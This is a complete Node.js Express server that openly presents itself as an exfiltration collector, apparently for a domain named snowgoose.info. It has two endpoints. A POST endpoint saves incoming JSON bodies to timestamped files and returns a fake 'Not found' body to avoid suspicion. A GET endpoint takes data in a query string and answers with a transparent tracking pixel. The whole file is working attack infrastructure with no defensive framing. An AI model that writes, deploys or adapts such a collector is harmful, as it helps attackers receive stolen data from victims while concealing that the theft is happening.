// Simple Node.js Express server for snowgoose.info const express = require('express'); const cors = require('cors'); const fs = require('fs'); const app = express(); app.use(cors()); // Allow cross-origin requests app.use(express.json({limit: '10mb'})); // Endpoint to receive exfiltrated data app.post('/swan-capture', (req, res) => { const data = req.body; const timestamp = new Date().toISOString().replace(/:/g, '-'); // Save to file with timestamp fs.writeFileSync(`./captured-${timestamp}.json`, JSON.stringify(data, null, 2)); console.log('Captured data from:', req.headers['user-agent']); // Return success but make it look like an error page to avoid suspicion res.status(200).send('Not found'); }); // Image-based exfiltration endpoint app.get('/swan-capture/img', (req, res) => { const data = req.query.data; if (data) { const timestamp = new Date().toISOString().replace(/:/g, '-'); fs.writeFileSync(`./img-captured-${timestamp}.txt`, data); console.log('Captured data via image from:', req.headers['user-agent']); } // Return a tiny transparent pixel const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64'); res.setHeader('Content-Type', 'image/gif'); res.send(pixel); }); app.listen(3000, () => { console.log('Exfiltration server running on port 3000'); });
